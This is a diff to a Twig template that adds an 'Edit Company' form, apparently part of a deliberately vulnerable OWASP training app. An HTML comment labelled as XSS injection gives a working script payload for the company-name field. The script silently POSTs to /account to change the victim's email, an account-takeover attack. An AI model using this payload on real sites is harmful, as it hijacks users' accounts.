@@ -14,4 +14,21 @@
             <button type="submit" class="btn btn-primary">Modifier</button>
         {{ form_end(form) }}
     </div>
+
+    {#TODO merge#}
+    <h1>Edit Company</h1>
+    <form action="{{ path('app_company_submit') }}" method="POST">
+        <input type="hidden" class="form-control" id="id" name="id" value="{{ company.id }}">
+        <div class="mb-3">
+            <label for="name" class="form-label">Company name *</label>
+            <!--
+            OWASP 3 - XSS Injection
+            FIXME - HACK : add Company name<script>fetch('/account',{method: "POST",credentials: "same-origin",headers:{'Content-Type': 'application/x-www-form-urlencoded'},body:'email=test2@evil.com'})</script> -->
+            <input type="text" class="form-control" id="name" name="name" placeholder="enter some text" required value="{{ company.name }}">
+        </div>
+        <div class="text-end">
+            <a class="btn btn-secondary" href="{{ path('app_companies') }}">Cancel</a>
+            <button class="btn btn-success" type="submit">Submit</button>
+        </div>
+    </form>
 {% endblock %}
